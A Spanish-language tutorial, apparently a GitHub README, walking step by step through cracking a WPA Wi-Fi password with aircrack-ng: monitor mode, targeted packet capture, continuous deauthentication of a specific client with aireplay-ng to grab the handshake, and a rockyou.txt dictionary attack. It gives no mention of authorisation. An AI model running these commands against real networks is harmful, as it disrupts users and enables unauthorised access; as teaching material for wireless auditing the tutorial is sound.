# Informacion importante de algunos de los comandos

 ![comandos-aircrak](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/fb6f860a-2491-41bf-9a56-fc8152d71266)

 
 ## Antes de emepezar se recomienda que creas una carpeta donde se van a guardar archivos que mas adelante vayamos a generar.

> Nos convertimos en usuario root

	sudo su

> Creamos la carpeta

 	mkdir webAuth
  
> Nos movemos a la carpeta y desde ahi trabajamos

	cd webAuth/

## Vemos cual es el nombre de nuestra interfaz de red

	iwconfig

![iwconfig](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/a2931782-dd40-44c4-92f0-a480efee4212)

Montamos a nuestra interfaz

	airmon-ng start wlp0s20f3  

### Foto 
> Volvemos a usar el comando **iwconfig** para mostrar que en nuestra tarjeta de red se haya hecho el montaje adecuado.

![image](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/53d2d6d8-6a08-41a2-b7c1-9b776ca68094)


> [!Note]
> No en todas las ocaciones se hace ver el nombre con la extencon **mon**. La manera en la que yo veo que se llevo correcto el montaje es cuando he perdido el internet.


## Capturamos los paquetes de la red con el siguiente comando: 

	airodump-ng wlp0s20f3mon

### Foto

![analisis_red](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/98ecd24a-9c01-4f60-a361-e0a7f5619e95)

## Analizamos las redes conectadas a un solo router
#### Explicacion del comando antes de ejecutar
Componentes del Comando

  *  `airodump-ng`: Esta es la herramienta principal del conjunto de herramientas aircrack-ng utilizada para capturar paquetes de redes inalámbricas y mostrar información sobre puntos de acceso y clientes conectados.

  *  `-c1`: Este es el canal en el que airodump-ng va a escuchar. El 1 indica que va a escuchar en el canal 1. Los canales de Wi-Fi varían de 1 a 14 (dependiendo de la región).

  *  `-w auditoria`: Este es el prefijo del nombre del archivo donde se guardarán los datos capturados. En este caso, los archivos de salida se llamarán auditoria-01.cap, auditoria-02.cap, etc.

  *  `-d 50:4E:DC:38:C2:60`: Este es el filtro de dirección MAC. airodump-ng solo capturará paquetes que tengan como destino o procedan de esta dirección MAC específica, que corresponde a un dispositivo o punto de acceso en particular.

  *  `wlp0s20f3mon`: Este es el nombre de la interfaz de red en modo monitor que se utilizará para la captura de paquetes. El modo monitor permite que la tarjeta de red capture todo el tráfico inalámbrico que puede recibir, no solo el tráfico destinado a ella.

```bash
airodump-ng -c1 -w auditoria -d 50:4E:DC:38:C2:60  wlp0s20f3mon
```
### Foto

![auditoria-2](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/4bff2c5a-9e73-41fb-8410-cbb2a66923d9)


## Hacemos el ataque

#### Explicacion del comando
### Explicacion del comando anterior.
-   `aireplay-ng` se utiliza para enviar paquetes de desautenticación a una red inalámbrica, lo cual puede desconectar dispositivos específicos o todos los dispositivos de esa red.
-   `--deauth [number of deauth packets]`: Especifica el número de paquetes de desautenticación a enviar. Usar `0` enviará paquetes de desautenticación de manera continua.
-   `-c [target device MAC address]`: La dirección MAC del dispositivo que deseas desconectar.
-   `-a [AP MAC address]`: La dirección MAC del punto de acceso (router).
-   `[interface]`: La interfaz en modo monitor (por ejemplo, `wlan0mon`).

> [!IMPORTANT]
> Si no especificas `-c [target device MAC address]`, se intentará desconectar todos los dispositivos de la red.
```
aireplay-ng --deauth 0 -a 50:4E:DC:38:C2:60 -c B2:11:8E:B5:DF:0D  wlp0s20f3mon
```
### Foto


![ataque](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/cca65636-9e6c-4bc8-96db-56f3019b0b26)


Esperamos a que salga en la parte de arriba 

> WPA handshake: 50:4E:DC:38:C2:60 

![image](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/c59e0f83-6bdc-46dc-b68c-9ccf7981a13b)


## Comparamos la contrasen con nuestro archivo 

	aircrack-ng auditoria-01.cap -w rockyou.txt

### Foto

![crackingpss](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/3bc59e9a-e8ef-40b7-a5b6-f8f3a6b5f51c)


## Regresamos a nuestra interfaz normal

	airmon-ng stop wlp0s20f3mon


![apagamos-montaje-interfaz](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/673ac3b4-159a-4dab-8087-6839a0f2553e)

